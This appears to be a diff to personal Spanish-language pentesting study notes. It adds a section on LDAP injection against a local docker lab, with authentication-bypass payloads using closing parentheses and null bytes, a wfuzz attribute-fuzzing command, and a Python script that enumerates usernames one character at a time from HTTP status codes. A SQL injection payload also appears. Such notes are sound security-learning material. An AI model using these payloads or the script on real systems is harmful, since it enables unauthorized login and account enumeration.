@@ -668,3 +668,142 @@ if __name__ == '__main__':
 con el input:
 ` admin' || '1'=='1
 veo todos los usuarios en la DB 
+
+# 14. [[LDAP injection]]
+```
+$ docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.2.2
+```
+```
+$ docker build -t ldap-client-container .
+$ docker run --link openldap-container -p 8888:80 ldap-client-container
+```
+$ ldapsearch -x -H ldap://localhost -b "dc=example,dc=org" -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
+
+dc es el dominio de busqueda
+cn es la forma de indicar el nombre del usario
+
+se puede usar una query con AND para filtrar por el usuario admin
+```bash
+$ ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP*))'
+```
+
+si se envian estos datos puedo hacer que no te tome en cuenta el resto de los datos del payload cerrando dos parentesis y un null byte "))%00:
+```bash
+user_id=admin))%00$password=testing&login=1&submit=Submit
+```
+
+con este script voy a crear un nuevo usuario:
+ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldif
+
+se puede fuzzear los atributos de un usuario
+
+```bash
+(&
+	(cn=admin)
+	(FUZZ=*))%00
+	(userPassword=*)
+)
+```
+` wfuzz -c -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d "user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit" localhost:8888
+
+| parametro | descripcion                       |
+| --------- | --------------------------------- |
+| -c        | output coloreado                  |
+| -w        | especifica los datos del wordlist |
+| -d        | datos post para enviar            |
+
+Este es un ataque de LDAP Injection donde:
+- )(FUZZ=*))%00 → Cierra el filtro anterior (user_id=admin) y abre uno nuevo con el atributo fuzzed con un null byte que cierra el resto de la query
+- El objetivo es bypass de autenticación mediante inyección LDAP
+
+con el parametro de wfuzz --hc=200 puedo hacer que no me muestre las responses que devuelven ese codigo
+
+##### en caso de que ya conozca un atributo del usuario
+puedo usar una query de este tipo:
+`user_id=admin)(mail=*))%00&password=*&login=1&submit=Submit`
+(lo que esta luego del null byte %00 se descarta)
+y depende de los codigos http se puede descrifrar que caracteres son correctos para el atributo solicitado
+
+script para automatizar la deteccion de usuarios en base a las respuestas a las peticiones POST
+
+```python
+#!/usr/bin/python3
+
+import requests
+import time
+import sys
+import signal
+import string
+import pdb
+
+from pwn import *
+
+
+def def_handler(sig, frame):
+    print("\n\n[!] exit...\n")
+    sys.exit(1)
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "http://localhost:8888/"
+# para configurar el proxy de burp, si se quiere usar
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+
+def getInitialUsers():
+    characters = string.ascii_lowercase
+    # pdb.set_trace()
+    # esto sirve ver los usuarios en characters, como un debugging
+
+    initial_users = []
+    for character in characters:
+        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
+
+        r = requests.post(
+            main_url, data=post_data, headers=headers, allow_redirects=False
+        )
+
+        if r.status_code == 301:
+            initial_users.append(character)
+    return initial_users
+
+
+def getUsers(u):
+    characters = string.ascii_lowercase + string.digits
+    valid_users = []
+
+    # bucle en cada uno de los usuarios
+    for first_char in u:
+        user = ""
+
+        # bucle en cada una de las posiciones del usuario, hasta 15 caracteres
+        for position in range(1, 15):
+            found_character = False
+
+            # bucle en cada uno de los caracteres posibles para esa posición
+            for character in characters:
+                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(
+                    first_char, user, character
+                )
+
+                r = requests.post(
+                    main_url, data=post_data, headers=headers, allow_redirects=False
+                )
+                if r.status_code == 301:
+                    user += character
+                    found_character = True
+                    break
+
+            if not found_character:
+                break
+        valid_users.append(first_char + user)
+    return valid_users
+
+
+if __name__ == "__main__":
+    users = getUsers(getInitialUsers())
+    print(users)
+
+```
+
